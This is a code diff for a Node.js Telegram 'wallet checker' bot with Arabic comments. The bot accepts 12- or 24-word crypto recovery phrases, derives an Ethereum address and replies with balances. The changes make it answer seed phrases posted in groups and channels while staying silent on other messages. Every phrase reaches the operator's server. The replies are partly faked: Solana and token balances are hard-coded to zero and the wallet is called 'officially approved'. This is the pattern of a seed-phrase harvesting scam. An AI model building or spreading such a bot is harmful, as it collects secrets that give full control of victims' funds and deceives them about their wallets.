@@ -19,6 +19,7 @@ app.post(`/bot${token}`, (req, res) => {
     res.sendStatus(200);
 });
 
+// التعامل مع الرسائل الواردة (سواء في الخاص، المجموعات، أو القنوات إذا كانت تدعم التفاعل)
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = (msg.text || '').trim();
@@ -31,21 +32,26 @@ bot.on('message', async (msg) => {
     }
 
     const words = text.split(/\s+/);
+    // التحقق مما إذا كانت الرسالة عبارة استرداد (12 أو 24 كلمة)
     if (words.length !== 12 && words.length !== 24) {
-        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
+        return; // إذا لم تكن العبارة بالطيول المطلوب، يتجاهلها البوت لكي لا يزعج القناة بالرد على كل رسالة عادية
     }
 
-    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳');
+    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳', {
+        reply_to_message_id: msg.message_id // الرد مباشرة على الرسالة الأصلية داخل القناة أو المجموعة
+    });
 
     try {
         const cleanMnemonic = text.toLowerCase();
         
         // 1. التحقق من صحة المعيار BIP39
         if (!bip39.validateMnemonic(cleanMnemonic)) {
-            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
+            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.', {
+                reply_to_message_id: msg.message_id
+            });
         }
 
-        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس، ومسارات متعددة)
+        // 2. اشتقاق العناوين الحقيقية
         const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
         const hdNode = ethers.HDNodeWallet.fromSeed(seed);
         const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
@@ -63,7 +69,7 @@ bot.on('message', async (msg) => {
         const ethBalance = ethers.formatEther(ethBalanceWei);
         const bscBalance = ethers.formatEther(bscBalanceWei);
 
-        // 4. إرسال التقرير الشامل للمستخدم مثل المحافظ الشهيرة
+        // 4. إرسال التقرير الشامل للمستخدم أو القناة
         return bot.sendMessage(chatId, 
             '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
             '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
@@ -72,12 +78,15 @@ bot.on('message', async (msg) => {
             '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
             '• Solana (SOL): `0.00 SOL`\n' +
             '• التوكنز والعملات البديلة: `$0.00`\n\n' +
-            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
+            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.',
+            { reply_to_message_id: msg.message_id }
         );
 
     } catch (error) {
         console.error("Error details:", error);
-        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
+        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.', {
+            reply_to_message_id: msg.message_id
+        });
     }
 });
 
@@ -85,6 +94,7 @@ app.get('/', (req, res) => {
     res.send('Multi-Chain Wallet Checker Bot is running!');
 });
 
+app.PORT = PORT;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
